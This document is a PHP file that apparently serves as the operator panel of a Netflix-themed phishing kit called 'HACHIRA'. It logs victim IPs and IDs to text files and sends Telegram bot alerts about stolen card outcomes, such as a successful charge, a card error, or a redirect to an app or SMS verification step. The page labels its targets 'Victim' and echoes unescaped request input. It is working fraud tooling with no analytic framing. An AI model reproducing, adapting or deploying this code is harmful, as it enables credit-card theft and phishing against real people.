<?php
include "../send/panel.php";
session_start();

if (isset($_GET['type']) && isset($_GET['ip']) && isset($_GET['id'])) {
    $type = $_GET['type'];
    $ip = $_GET['ip'];
    $id = $_GET['id'];

    if ($type === 'success' || $type === 'carderror' || $type === 'app' || $type === 'sms')  {
        $file = $type . '.txt';
        file_put_contents($file, "$ip:$id\n", FILE_APPEND);
        
        // Message content based on the type
        $message = '';
        if ($type === 'carderror') {
            $message = "🌐IP: $ip\n\nBsh yaawed ythabet m CC 😤";
        } elseif ($type === 'success') {
            $message = "🌐IP: $ip\n\nSa9in t'hazet wel cash mawjoud 🤑";
        } elseif ($type === 'app') {
            $message = "🌐IP: $ip\n\nMetaadi ll APP 🏦";
        } elseif ($type === 'sms') {
            $message = "🌐IP: $ip\n\nMetaadi ll SMS 📲";
        }

        // Send the message to Telegram
        $telegramURL = "https://api.telegram.org/bot{$botToken}/sendMessage?chat_id={$chatId}&text=" . urlencode($message);
        file_get_contents($telegramURL); // Send the message
    }
}
?>

<html lang="en" style="
    background: linear-gradient(to right, #db0000, #000000);
"><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
        }

        .header {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-top: 50px;
            border-radius: 15px 50px;
  background: linear-gradient(to right, #000000, #db0000);
  padding: 0px; 
        }

        .header img {
            width: 150px; /* Adjust the width as needed */
        }

        table {
            width: 80%;
            margin: 20px auto;
            border-collapse: collapse;
        }

        table, th, td {
            border-top: 6px solid silver;
        }

        th, td {
            color: white;
            padding: 10px;
            text-align: center;
        }
    </style>
<style type="text/css" id="operaUserStyle"></style></head>
<body>
    <div class="header">
        <img src="thirdeye.png" alt="Your Logo">
        <p style="
    font-size: 20px;
    font-weight: bold;
    color: #fff;
">HACHIRA (NETFLIX)</p>
    </div>
    
    <p style="
    color: #fff;
    font-size: 30px;
"> <?php if (isset($type)) {echo "Victim Redirecting to $type Page";}?> </p>
    
    <table>
        <tr style="background: black;">
            <th>Redirection</th>
            <th>IP</th>
            <th></th>
        </tr>
        <tr>
            <td><?php echo isset($type) ? $type : ''; ?></td>
            <td><?php echo isset($ip) ? $ip : ''; ?></td>
            <td>
                <?php
                if (isset($type)) {
                    if ($type === 'error') {
                        echo "<img src='smms.gif' alt='ERROR Image' style='max-width: 50px;'>";
                    } elseif ($type === 'success') {
                        echo "<img src='success.gif' alt='SUCCESS Image' style='max-width: 50px;'>";
                    }
                }
                ?>
            </td>
        </tr>
    </table>
</body>
</html>